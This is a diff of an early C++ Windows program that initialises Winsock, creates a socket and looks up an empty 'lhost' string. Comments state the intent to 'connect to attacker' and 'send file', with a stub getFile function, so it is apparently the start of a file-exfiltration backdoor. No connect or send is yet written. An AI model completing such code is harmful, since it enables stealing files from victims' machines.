@@ -8,23 +8,38 @@
 #include <stdlib.h>
 
 using namespace std;
-
+const char lhost[] = "";
 int main()
 {
-    //winsock init
+    // winsock init
     WSADATA wsaData;
     WORD DLLversion = MAKEWORD(2, 1);
     if (WSAStartup(DLLversion, &wsaData) != 0)
+    {
+        printf("Erorr, can't continue.");
         ExitProcess(EXIT_FAILURE);
+    }
 
-    //Create Socket
+    // Create Socket
+
     SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0)
+    {
+        printf("Erorr, can't continue.");
+    }
 
-    //connect to attacker
+    // connect to attacker
+    HOSTENT *host = gethostbyname(lhost);
+    if (host == nullptr)
+        ExitProcess(EXIT_FAILURE);
+    // take action
 
-    //take action
-
-    //action 1: send file with (name)
+    // action 1: send file with (name)
 
     ExitProcess(EXIT_SUCCESS);
+}
+
+void getFile(string path)
+{
+    return;
 }
